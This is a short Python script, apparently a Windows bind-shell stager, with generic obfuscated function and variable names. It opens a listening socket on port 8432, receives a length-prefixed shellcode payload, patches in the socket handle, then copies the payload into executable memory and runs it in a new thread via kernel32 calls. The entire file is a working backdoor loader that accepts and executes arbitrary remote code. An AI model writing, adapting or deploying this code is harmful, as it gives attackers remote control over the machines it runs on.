import struct, socket, binascii, ctypes, random, time
shellcodepy, var1 = None, None
def func1():
	try:
		global var1
		global datapack
		var1 = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		var1.bind(('0.0.0.0', 8432))
		var1.listen(1)
		datapack,_ = var1.accept()
		datahandler = struct.pack('<i', datapack.fileno())
		l = struct.unpack('<i', datapack.recv(4))[0]
		datastream = b"     "
		while len(datastream) < l: datastream += datapack.recv(l)
		cbuffer = ctypes.create_string_buffer(datastream, len(datastream))
		cbuffer[0] = binascii.unhexlify('BF')
		for i in range(4): cbuffer[i+1] = datahandler[i]
		return cbuffer
	except: return None
def func2(arg2):
	if arg2 != None:
		binarg2 = bytearray(arg2)
		shellcode_ptr = ctypes.windll.kernel32.VirtualAlloc(ctypes.c_int(0),ctypes.c_int(len(binarg2)),ctypes.c_int(0x3000),ctypes.c_int(0x40))
		ctypes.windll.kernel32.VirtualLock(ctypes.c_int(shellcode_ptr), ctypes.c_int(len(binarg2)))
		cbuff_ptr = (ctypes.c_char * len(binarg2)).from_buffer(binarg2)
		ctypes.windll.kernel32.RtlMoveMemory(ctypes.c_int(shellcode_ptr), cbuff_ptr, ctypes.c_int(len(binarg2)))
		ht = ctypes.windll.kernel32.CreateThread(ctypes.c_int(0),ctypes.c_int(0),ctypes.c_int(shellcode_ptr),ctypes.c_int(0),ctypes.c_int(0),ctypes.pointer(ctypes.c_int(0)))
		ctypes.windll.kernel32.WaitForSingleObject(ctypes.c_int(ht),ctypes.c_int(-1))
shellcodepy = func1()
func2(shellcodepy)